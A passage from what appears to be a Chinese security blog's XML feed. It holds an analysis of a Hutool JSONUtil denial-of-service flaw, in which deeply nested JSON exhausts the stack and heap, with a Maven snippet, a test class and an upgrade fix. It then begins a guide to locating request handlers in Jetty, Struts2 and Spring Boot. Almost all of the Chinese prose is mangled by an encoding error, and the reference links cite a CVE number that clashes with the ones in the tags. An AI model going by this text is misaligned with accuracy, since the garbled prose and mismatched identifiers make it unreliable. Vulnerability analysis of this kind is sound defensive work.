<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;hutool-all-version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¼–å†™æµ‹è¯•ç±»</p>
<p><img src="/archives/3f6576a1/image-20230811112000265.png" alt="image-20230811112000265"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;json_str&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONUtil.parseObj(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>ä¸€èˆ¬æˆ‘ä»¬å¤ç°æ¼æ´æ—¶éƒ½éœ€è¦åˆ©ç”¨ä¸€äº›æ³„éœ²çš„æœ‰å…³æ¼æ´çš„ä¿¡æ¯ï¼Œæ¯”å¦‚åˆ«äººå‘çš„é€šå‘Šä¸­æœªæ‰“ç å®Œå…¨çš„æˆªå›¾ã€æ¼æ´æè¿°ç­‰ä¿¡æ¯ï¼Œè¿™é‡Œæˆ‘ä»¬ä»é˜¿é‡Œäº‘æ¼æ´åº“çš„æè¿°ä¸­äº†è§£åˆ°è¯¥æ¼æ´çš„å¤§è‡´æƒ…å†µï¼š</p>
<p><img src="/archives/3f6576a1/image-20230811112316260.png" alt="image-20230811112316260"></p>
<p>é‡Œé¢æœ‰ä¸¤ä¸ªå…³é”®ä¿¡æ¯ï¼Œä¸€æ˜¯åµŒå¥—æ·±åº¦ã€äºŒæ˜¯æ ˆæº¢å‡ºï¼Œé‚£è¿™ä¸å¦¥å¦¥çš„æ— çº¿é€’å½’å¯¼è‡´çš„æ ˆæº¢å‡ºæ¼æ´å—ï¼Ÿå…ˆæ•´2000å±‚åµŒå¥—æ‰“ä¸€ä¸‹è¯•è¯•ï¼š</p>
<p><img src="/archives/3f6576a1/image-20230811133440365.png" alt="image-20230811133440365"></p>
<p>æœç„¶æ ˆæº¢å‡ºäº†ï¼Œæ‰“å®Œæ”¶å·¥ï¼Œå›å®¶å¹ç©ºè°ƒäº†ã€‚</p>
<p>å•¥ï¼Ÿä½ è¯´è¿™å¤ªç®€å•äº†ï¼Œä½ æƒ³å­¦ç‚¹ç¡¬è´§ï¼Ÿè¡Œï¼Œé‚£å’±ä¸Šç¡¬è´§ã€‚</p>
<p>è¿™ä¸ªæ¼æ´åˆ†æç¬¬ä¸€æ­¥è‚¯å®šæ—¶å…ˆæŠŠæ–­ç‚¹æ‰“èµ·æ¥ï¼Œæˆ‘ä»¬å‘ç°æ‰€è°“çš„<code>parseObj</code>å…¶å®å°±æ˜¯newäº†ä¸€ä¸ª<code>JSONObject</code>å¯¹è±¡ã€‚</p>
<p><img src="/archives/3f6576a1/image-20230811133657015.png" alt="image-20230811133657015"></p>
<p>åˆ›å»ºå¯¹è±¡æ—¶ä¼šè°ƒç”¨<code>init</code>æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­ä¼šæ ¹æ®æˆ‘ä»¬è¾“å…¥çš„å‚æ•°ç±»å‹é€‰æ‹©ä¸åŒçš„é‡è½½å‡½æ•°è¿›è¡Œè§£æï¼Œæˆ‘ä»¬è¾“å…¥çš„æ—¶ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¼šè¿›å…¥åˆ°ç¬¬680è¡Œçš„é€»è¾‘é‡Œã€‚</p>
<p><img src="/archives/3f6576a1/image-20230811133906215.png" alt="image-20230811133906215"></p>
<p>è¿™é‡Œå¹²çš„ä»€ä¹ˆæ³¨é‡Šè¯´çš„å·²ç»å¾ˆæ¸…æ¥šäº†</p>
<p><img src="/archives/3f6576a1/image-20230811134053659.png" alt="image-20230811134053659"></p>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªå‡½æ•°è§£é‡Šä»¥ä¸‹ï¼Œé¦–å…ˆæ—¶<code>nextClean</code>ä¼šå»è·å–jsonå­—ç¬¦ä¸²çš„tokenä¹Ÿå°±æ˜¯<code>&quot; &#123; &#125; : [ ]</code>è¿™ä¸€äº›ï¼Œ<code>nextValue</code>ä¼šå»è·å–jsonå­—ç¬¦ä¸²é”®å¯¹åº”çš„å€¼ã€‚è¿™ä¸ªæ¼æ´å°±å‡ºç°åœ¨757è¡Œå°†jsonçš„é”®å€¼å¯¹ï¼Œå¾€JSONObjectå¯¹è±¡é‡Œæ”¾çš„æ—¶å€™ï¼Œåœ¨è·å–jsonå€¼å¾—æ—¶å€™ä¼šè°ƒç”¨netValueå‡½æ•°ã€‚</p>
<p><img src="/archives/3f6576a1/image-20230811134202285.png" alt="image-20230811134202285"></p>
<p>è¿™ä¸ªå‡½æ•°ä¼šæ ¹æ®ä»<code>:</code>åè§£æåˆ°å¾—ç¬¬ä¸€ä¸ªtokenç±»å‹å»è°ƒç”¨ä¸åŒå¾—é€»è¾‘ï¼Œå½“è§£æçš„tokenä¸º<code>&#123;</code>æ—¶å°±ä¼šå†newä¸€ä¸ªJSONObjectå¯¹è±¡ã€‚å•Šï¼Œè¿™è¿™è¿™ï¼Œè¿™ä¸å°±é€’å½’äº†å—ï¼Ÿ</p>
<p><img src="/archives/3f6576a1/image-20230811134541231.png" alt="image-20230811134541231"></p>
<p>æˆ‘ä»¬çŸ¥é“é€’å½’è¿‡ç¨‹ä¸­å‡½æ•°ä¼šä¸æ–­åœ°å‹æ ˆï¼Œè€Œæ ˆç©ºé—´æ˜¯æœ‰é™åœ°ï¼Œå¦‚æœä¸æ–­åœ°å‹æ ˆè€Œä¸å¼¹æ ˆåœ°è¯å°±ä¼šå¯¼è‡´æ ˆæº¢å‡ºï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªåŸºä¾‹æ¥å¸®åŠ©å‡½æ•°è§£æåˆ°æœ€æ·±å¤„èƒ½å¤Ÿå›é€€ï¼Œè€Œåœ¨jsonå­—ç¬¦ä¸²è§£æè¿‡ç¨‹ä¸­å°±æ˜¯å½“è§£æåˆ°æœ€åä¸€ä¸ª<code>&#123;</code>æ—¶å¼€å§‹å›é€€ã€‚ä½†æ˜¯è¿™ä¸ªjsonå­—ç¬¦ä¸²åœ°é•¿åº¦å†è¿™é‡Œæˆ‘ä»¬è‹¥æ˜¯å¯ä»¥æ§åˆ¶åœ°è¯ï¼Œå°±å¯ä»¥å…ˆæå‡ ä¸‡å±‚åµŒå¥—è®©å®ƒä¸€ç›´å‹æ ˆç›´åˆ°æº¢å‡ºä¸ºæ­¢ï¼Œå› ä¸ºå†åˆ†æè¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰çœ‹åˆ°ä»£ç ä¸­æœ‰å¯¹åµŒå¥—æ·±åº¦åœ°é™åˆ¶ã€‚</p>
<p>è¿™ä¸ªæ¼æ´æ˜¯æ ˆæº¢å‡ºæ¼æ´ï¼Œè€Œï¼ˆCVE-2022-45689ï¼‰ç¡®å®ä¸€ä¸ªå®æ‰“å®å¾—å †æº¢å‡ºæ¼æ´ï¼Œä¸€èˆ¬æ¥è¯´å †æº¢å‡ºæ—¶éå¸¸å°‘è§å¾—ï¼Œåº”ä¸ºJVMå †æ˜¯éå¸¸å¤§çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»£ç ç­”åº”ä¸€ä¸‹ä¸€ä¸ªæ™®é€šçš„javaç¨‹åºè¿è¡Œæ—¶JVMå¯ç”¨çš„å †å†…å­˜æƒ…å†µã€‚</p>
<p><img src="/archives/3f6576a1/image-20230811152225458.png" alt="image-20230811152225458"></p>
<p>ä»ç»“æœæ¥çœ‹JVMåˆå§‹åŒ–æ—¶ä½¿ç”¨çš„æ€»çš„å †å†…å­˜ä¸º241MBï¼Œè€Œå¯ç”¨çš„æœ€åˆ°å †å†…å­˜è¾¾åˆ°3GBï¼Œä¸€èˆ¬æ¥è¯´æ—¶å¾ˆéš¾å‘ç”Ÿæº¢å‡ºçš„ã€‚æˆ‘ä»¬çŸ¥é“ï¼ŒJVMå †å†…å­˜ä¸­ä¸€èˆ¬å­˜å‚¨çš„æ—¶javaå¯¹è±¡ï¼Œè¦æƒ³è¦JVMå †å‘ç”Ÿæº¢å‡ºä¹Ÿå°±æ˜¯è¯´è¦æœ‰å¤§é‡çš„æ²¡æœ‰è¢«GCå›æ”¶çš„å¯¹è±¡å æ»¡äº†å†…å­˜ï¼Œä½†æ˜¯å¦‚æœåªæ˜¯å•çº¯å¾—å¸¸è§å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡åœ¨æ²¾æ»¡äº†å¹¸å­˜è€…0åŒºåä¼šè¢«GCæ¸…é™¤æ‰ï¼Œä¸€èˆ¬ä¹Ÿä¸ä¼šå¯¼è‡´å †æº¢å‡ºï¼Œé™¤éè¿™äº›å¯¹è±¡æ—¶ä¸å¯æ¸…é™¤å¾—ï¼Œé‚£ä¹ˆä»€ä¹ˆæƒ…å†µä¸‹å¾—å¯¹è±¡æ—¶ä¸å¯æ¸…é™¤å¾—å‘¢ã€‚GCåœ¨è¿›è¡Œåƒåœ¾å›æ”¶æ—¶å¯ä»¥é‡‡ç”¨å¤šç§ç­–ç•¥ï¼Œå…¶ä¸­åŒ…æ‹¬å¼•ç”¨è®¡æ•°æ³•ï¼Œå³æŸ¥çœ‹ä¸€ä¸ªå¯¹è±¡æ˜¯å¦æœ‰è¢«åˆ«å¾—å¯¹è±¡å¼•ç”¨ï¼Œå¦‚æœæ²¡æœ‰åˆ™å¯ä»¥æ¸…é™¤ï¼Œå¦‚æœæœ‰åˆ™ä¸æ¸…é™¤ï¼Œä½†æ˜¯è¿™ä¸ªç®—æ³•æœ‰ç¼ºé™·è§£å†³ä¸äº†å¾ªç¯å¼•ç”¨å¾—é—®é¢˜ï¼Œæ‰€ä»¥åˆæœ‰äº†å¯è¾¾æ€§åˆ†æç®—æ³•ï¼ŒåŠä»ä¸€ç³»åˆ—å¾—GC Rootså¼€å§‹åˆ†æä¸€ä¸ªå¯¹è±¡å¾—å¯è¾¾æ€§ï¼Œå¦‚æœè¿™ä¸ªå¯¹è±¡ä¸å¯è¾¾åˆ™è¿›è¡Œæ¸…é™¤ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­è¿›è¡ŒJSONObjectè§£æé€’å½’åˆ°æœ€æ·±å±‚è¿›è¡Œè¿”å›æ—¶ï¼Œæ¯ä¸€ä¸ª<code>&#123;xx:1&#125;</code>éƒ½å°†è¢«newä¸ºä¸€ä¸ªæ–°çš„<code>JSONObject</code>å¯¹è±¡å¹¶è¢«ä¸æ–­åœ°å¼•ç”¨åµŒå¥—ï¼Œæœ€ç»ˆæ‰€æœ‰çš„<code>JSONObject</code>å¯¹è±¡ä¸€èµ·é“¾æ¥åœ¨ä¸€èµ·å æ»¡äº†å †å†…å­˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨jconsoleæ¥è§‚å¯Ÿä¸€ä¸‹JVMçš„å †å†…å­˜å˜åŒ–æƒ…å†µï¼š</p>
<p><img src="/archives/3f6576a1/image-20230811153435062.png" alt="image-20230811153435062"></p>
<p>jconsoleå¯èƒ½ä¸å¤ªç›´è§‚ï¼Œå¯ä»¥ä¸‹è½½<code>virtual VM</code>è¿›è¡Œç›‘æ§</p>
<p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip">https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip</a></p>
<p><img src="/archives/3f6576a1/image-20230811154033340.png" alt="image-20230811154033340"></p>
<p>æœ€å¼€å§‹æˆ‘ä»¬çš„ç¨‹åºä¼‘çœ äº†20ç§’ï¼ˆä¸ºäº†ç»™jconsoleé“¾æ¥æä¾›æ—¶é—´ï¼‰ä¼‘çœ ç»“æŸåå¼€å§‹è¿›è¡Œjsonå­—ç¬¦ä¸²çš„è§£æï¼Œå¼€å§‹é˜¶æ®µåº”ä¸ºè¿˜æ²¡æœ‰é€’å½’åˆ°æœ€æ·±å¤„æ‰€ä»¥å †å†…å­˜å¢åŠ é‡ä¸å¤§ï¼Œåœ¨é€’å½’è¾¾åˆ°æœ€æ·±å¤„å‡½æ•°ä¸æ–­è¿”å›æ—¶ï¼Œå †å†…å­˜ç©ºé—´çš„æ¶ˆè€—ä¸æ–­èµ°é«˜ï¼Œæœ€ç»ˆè€—å°½å†…å­˜èµ„æºå¯¼è‡´å †æº¢å‡ºã€‚æˆ‘ä»¬æŠŠé«˜å³°æœŸçš„å †å†…å­˜dumpå‡ºæ¥</p>
<p><img src="/archives/3f6576a1/image-20230811154905943.png" alt="image-20230811154905943"></p>
<p>å¯ä»¥çœ‹åˆ°è¶³è¶³1.7Gçš„å†…å­˜éƒ½è¢«æˆ‘ä»¬çš„jsonå­—ç¬¦ä¸²å æ®ã€‚</p>
<h2 id="ä¿®å¤æªæ–½"><a href="#ä¿®å¤æªæ–½" class="headerlink" title="ä¿®å¤æªæ–½"></a>ä¿®å¤æªæ–½</h2><ol>
<li>å‡çº§è½¯ä»¶åˆ°ä¸å—å½±å“çš„ç‰ˆæœ¬æˆ–æœ€æ–°ç‰ˆï¼Œå®˜æ–¹ä»“åº“åœ°å€ï¼š<a href="https://github.com/dromara/hutool/releases%E3%80%82">https://github.com/dromara/hutool/releasesã€‚</a></li>
</ol>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-37582">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-37582</a></li>
<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582</a></li>
<li><a href="https://avd.aliyun.com/detail?id=AVD-2022-45689">https://avd.aliyun.com/detail?id=AVD-2022-45689</a></li>
<li><a href="https://github.com/dromara/hutool/issues/2746">https://github.com/dromara/hutool/issues/2746</a></li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
        <category>å®‰å…¨æŠ€æœ¯</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ¼æ´åˆ†æ</tag>
        <tag>æ¼æ´</tag>
        <tag>Hutool</tag>
        <tag>JSONUtilæ‹’ç»æœåŠ¡æ¼æ´</tag>
        <tag>CVE-2022-45690</tag>
        <tag>CVE-2022-45689</tag>
        <tag>DoS</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVAç”Ÿæ€å¸¸è§æ¶æ„ä»‹ç»ã€é…ç½®ä¸é€»è¾‘å®šä½æ–¹æ³•</title>
    <url>/archives/b5364c9e.html</url>
    <content><![CDATA[<p>ä¸çŸ¥é“ä½ åœ¨æŒ–æ´è¿‡ç¨‹ä¸­æ˜¯å¦ç¢°åˆ°è¿‡è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œèµ„æºä¸‹è½½åˆ°äº†ï¼Œè°ƒè¯•ç¯å¢ƒä¹Ÿæå®šäº†å´è¿Ÿè¿Ÿæ‰¾ä¸åˆ°åˆé€‚çš„åœ°æ–¹ä¸‹æ–­ç‚¹è¿›è¡Œè°ƒè¯•ï¼Œè¿™æ—¶å€™ä½ ä¼šé€‰æ‹©æ€ä¹ˆåŠï¼Ÿ<br>æ˜¯å»å¯»æ‰¾å¯åŠ¨ç±»ä¸€è¡Œä¸€è¡Œä»£ç æŸ¥çœ‹ç›´åˆ°æ‰¾åˆ°URIçš„å¤„ç†å‡½æ•°ï¼Œè¿˜æ˜¯å¿«å‡†ç‹ åœ°å®šä½åˆ°å…³é”®ç‚¹é©¬ä¸Šå‡ºæ´ï¼Ÿæˆ‘æƒ³ä¸ä¼šæœ‰äººæƒ³è¦é€‰æ‹©ç¬¬ä¸€ç§æ–¹æ³•ï¼Œ<br>ä½†æŒ‰ç…§ç¬¬ä¸€ç§æ–¹æ³•ä¸æ–­åœ°ç†Ÿæ‚‰ä¸åŒçš„æ¡†æ¶çš„è¿‡ç¨‹å´æ˜¯ä¸€ä¸ªæŒ–æ´å°ç™½å‘å¤§ä½¬è¿›åŒ–çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¸æ–­åœ°ç§¯ç´¯è¶³å¤Ÿçš„ç»éªŒæ¥ç†Ÿæ‚‰å¸¸è§çš„æŠ€æœ¯ä¸æ¡†æ¶ï¼Œ<br>è¿™å‡ ä¹æ˜¯æ¯ä¸€ä¸ªå¤§ä½¬æˆé•¿è·¯ä¸Šå¿…é¡»è¦èµ°çš„è·¯ã€‚æ¯«æ— ç–‘é—®ï¼Œè¿™ç§æ›²æŠ˜çš„è¿‡ç¨‹æœ€èƒ½å¢é•¿äººä»¬çš„èƒ½åŠ›ï¼Œä¸è¿‡è¿™ä¸ªè¿‡ç¨‹å¾€å¾€æ˜¯ç—›è‹¦ä¸”æ¯ç‡¥çš„ï¼Œåœ¨æŒ–æ´è¿‡ç¨‹ä¸­ï¼Œæ—¶é—´ç´§ä»»åŠ¡é‡çš„æƒ…å†µä¸‹ï¼Œ<br>æˆ‘ä»¬å¾€å¾€åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æµªè´¹äº†å¤§é‡çš„æ—¶é—´ä¸ç²¾åŠ›ï¼Œæ‰€ä»¥æˆ‘ç»™å¤§å®¶ç®€å•æ€»ç»“äº†ä¸€ä¸‹æˆ‘ä»¬åº”è¯¥å¦‚ä½•å»æ‰¾åˆ°ä¸€äº›å¸¸è§æ¡†æ¶è¿›è¡Œèµ„æºå¤„ç†ä¸å­˜æ”¾ã€é…ç½®å­˜æ”¾ä¸è§£æè§„åˆ™çš„æ–¹æ³•ã€‚</p>
<span id="more"></span>

<h1 id="jetty"><a href="#jetty" class="headerlink" title="jetty"></a>jetty</h1><p>ä¸<code>tomcat</code>ä¸€æ ·ï¼Œ<code>jetty</code>ä¹Ÿæ˜¯ä¸€ä¸ª<code>jsp</code>ä¸<code>servlet</code>çš„å®¹å™¨ï¼Œä¸è¿‡ç›¸æ¯”<code>tomcat</code>ï¼Œå…¶åŠŸèƒ½æ›´åŠ ç²¾ç®€ï¼Œæ•´ä¸ªç¨‹åºçš„æ„å»ºé€»è¾‘ä¹Ÿä¸<code>tomcat</code>ä¹Ÿæœ‰è¾ƒå¤§çš„å·®å¼‚ï¼Œ<br>ä¸è¿‡æ—¢ç„¶æ˜¯<code>servlet</code>å®¹å™¨é‚£ä¹ˆå…¶å°†éµå¾ªä¸<code>tomcat</code>ä¸€æ ·çš„servletè§„èŒƒï¼Œå¦‚é…ç½®åœ¨<code>web.xml</code>ä¸­çš„<code>servlet-mapping</code>ä¸<code>filter-mapping</code>ç­‰ã€‚<br>å¯¹äºæ¼æ´æŒ–æ˜æ¥è®²ï¼Œå…¶å¹¶æ²¡æœ‰å¤ªè¿‡ç‹¬ç‰¹çš„åœ°æ–¹ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨çš„ä¹Ÿå°±æ˜¯web.xmlä¸­çš„é…ç½®ä¿¡æ¯ï¼Œç„¶åæ‰¾åˆ°å¯¹åº”çš„è¯·æ±‚å¤„ç†æ–¹æ³•è¿›è¡Œå®¡è®¡å³å¯ã€‚</p>
<h1 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1><p>åœ¨<code>spring mvc</code>ç«èµ·æ¥å‰ï¼Œ<code>struts</code>å°±æ˜¯æ¯”è¾ƒæµè¡Œçš„<code>MVC</code>æ¡†æ¶äº†ï¼Œä¸<code>spring mvc</code>ç±»ä¼¼ï¼Œ<code>struts</code>ä¹Ÿæ˜¯é‡‡ç”¨ç±»ä¼¼å‰ç«¯æ§åˆ¶å™¨çš„æ–¹å¼æ¥è¿›è¡Œè¯·æ±‚çš„åˆ†å‘ï¼Œ<br>ä¸è¿‡<code>struts2</code>æ˜¯é€šè¿‡<code>filter(StrutsPrepareAndExecuteFilter)</code>çš„æ–¹å¼è¿›è¡Œåˆ†å‘ï¼Œè€Œspringæ˜¯é€šè¿‡<code>servlet</code>ï¼Œä¸¤è€…æ²¡æœ‰æœ¬è´¨çš„åŒºåˆ«ã€‚</p>
<p><code>struts2</code>çš„è¯·æ±‚å¤„ç†æ–¹æ³•ä¸<code>spring</code>ä¸­çš„<code>controller</code>ä¸åŒï¼Œåœ¨<code>struts</code>ä¸­å…¶è¢«ç§°ä¸º<code>Action</code>ï¼Œæ¯ä¸ª<code>Action</code>è´Ÿè´£ä¸€ä¸ªè¯·æ±‚çš„å¤„ç†ï¼Œè¿™äº›<code>Action</code>ç±»é»˜è®¤ä½¿ç”¨<code>execute</code>æ–¹æ³•è¿›è¡Œè¯·æ±‚å¤„ç†ï¼Œ<br>ä¸è¿‡ä¹Ÿå¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­é€šè¿‡é€šè¿‡<code>action</code>æ ‡ç­¾å±æ€§<code>method</code>è¿›è¡ŒæŒ‡å®šã€‚</p>
<p><code>struts2</code>çš„é…ç½®æ–‡ä»¶åä¸º<code>struts.xml</code>ï¼Œåœ¨å®è·µä¸­<code>struts</code>å¾€å¾€ä½œä¸ºä¸€ä¸ªå…¥å£ï¼Œå…·ä½“çš„<code>Action</code>é…ç½®æ³¨å†Œé€šè¿‡<code>include</code>çš„æ–¹å¼åœ¨å…¶ä»–é…ç½®æ–‡ä»¶ä¸­å®ç°ï¼Œ<br>ä¸€èˆ¬ç›¸ä¼¼åŠŸèƒ½çš„<code>action</code>æ³¨å†Œåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå¦‚ä¸ç™»å½•ç›¸å…³çš„<code>action</code>å¯ä»¥æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å†å°†è¯¥æ–‡ä»¶åŒ…å«åˆ°<code>struts.xml</code>ä¸­ã€‚</p>
<p><code>struts2 action</code>æ˜¯è¢«<code>package</code>ç®¡ç†çš„ï¼Œæ¯ä¸ª<code>package</code>æ ‡ç­¾ä¸‹å¾€å¾€æœ‰å¤šä¸ª<code>action</code>æ ‡ç­¾ï¼Œæ¯ä¸ª<code>action</code>æ ‡ç­¾å¯ä»¥å¤„ç†ä¸€ä¸ªæˆ–å¤šä¸ªè¯·æ±‚ï¼Œå…·ä½“é€šè¿‡å¯¹æ ‡ç­¾å±æ€§<code>name</code>ä½¿ç”¨é€šé…ç¬¦çš„æ–¹å¼è¿›è¡Œï¼Œ<br>æ ‡ç­¾å±æ€§<code>class</code>æŒ‡å®š<code>action</code>çš„å¤„ç†ç±»ã€‚<code>action</code>æ ‡ç­¾ä¸‹çš„å­æ ‡ç­¾<code>result</code>èƒ½å¤Ÿæ ¹æ®è¯·æ±‚å¤„ç†æ–¹æ³•è¿”å›çš„å­—ç¬¦ä¸²åŠ è½½ä¸åŒçš„èµ„æºè¿›è¡Œè§†å›¾æ¸²æŸ“æ¥è¿›è¡Œå“åº”ã€‚</p>
<p>å¦‚ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*loginAction&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.www.LoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;&#123;1&#125;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸Šä¾‹æ³¨å†Œçš„<code>action</code>å°†ä¼šåŒ¹é…æ‰€æœ‰ä»¥<code>loginAction</code>ç»“å°¾çš„è¯·æ±‚ï¼Œå¹¶å°†è¯·æ±‚äº¤åˆ°<code>LoginAction</code>ç±»è¿›è¡Œå¤„ç†ï¼Œè°ƒç”¨çš„æ–¹æ³•æ˜¯è¢«<code>name</code>å±æ€§é€šé…ç¬¦åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²åŒåçš„æ–¹æ³•ã€‚<br>æ–¹æ³•è°ƒç”¨æˆåŠŸåè¿”å›<code>success</code>å°†åŠ è½½<code>index.jsp</code>æ¸²æŸ“å“åº”ç»™å®¢æˆ·ç«¯ã€‚</p>
<h1 id="spring-boot"><a href="#spring-boot" class="headerlink" title="spring boot"></a>spring boot</h1><p><code>spring boot</code>å¯èƒ½å®åœ¨æ²¡æœ‰ä»€ä¹ˆå€¼å¾—å¤šè¯´çš„ï¼Œå› ä¸ºå¤§å®¶éƒ½å¤ªç†Ÿäº†ï¼Œä¸€ä¸ªä¸¥æ ¼éµå¾ª<code>MVC</code>è§„èŒƒå¼€å‘çš„ç¨‹åºï¼ŒæŒ–æ´çš„æ ‡å‡†æ­¥éª¤å¯èƒ½å°±æ˜¯å…ˆåœ¨<code>web.xml</code>ä¸­æŸ¥çœ‹é…ç½®çœ‹çœ‹<code>filter</code>æœ‰å“ªäº› <code>servlet</code>æœ‰å“ªäº›ï¼Œ<br>ç„¶åå»ç…ç…å¯¹åº”çš„<code>servlet</code>ä¸<code>filter</code>çš„åŠŸèƒ½ï¼Œèƒ½æŒ–åˆ°æ´å°±çš†å¤§æ¬¢å–œï¼ŒæŒ–ä¸å€’å°±æ‹‰å€’ã€‚å¯èƒ½è¿™ä¸ªæµç¨‹å¤ªè¿‡æ ‡å‡†æˆ‘ä»¬å¾€å¾€å¿½è§†äº†ä¸€äº›å…¶ä»–çš„ç»†èŠ‚ã€‚ä½¿ç”¨<code>spring boot</code>å•ç‹¬æ‰“åŒ…çš„ç¨‹åºå¯èƒ½è¿™äº›é…ç½®çš„ä½ç½®å¾ˆå¥½æ‰¾ï¼Œ<br>ä½†ä¸€ä¸ªå¤§å‹åº”ç”¨åŠ¨è¾„å°±æ˜¯å‡ ç™¾ä¸ª<code>jar</code>åŒ…ï¼Œè¿™äº›ä¸åŒçš„åŠŸèƒ½å¯èƒ½è¢«æ‹†å¼€æ‰“åŒ…åˆ°ä¸åŒçš„<code>jar</code>åŒ…ï¼Œè¿™æ—¶å€™æ˜¯ä¸æ˜¯å°±æŠ“çäº†ï¼Ÿéš¾é“è¦ä¸€ä¸ªä¸€ä¸ªåœ°å»ç‚¹å¼€çœ‹ï¼Ÿå½“ç„¶æ²¡å¿…è¦ã€‚</p>
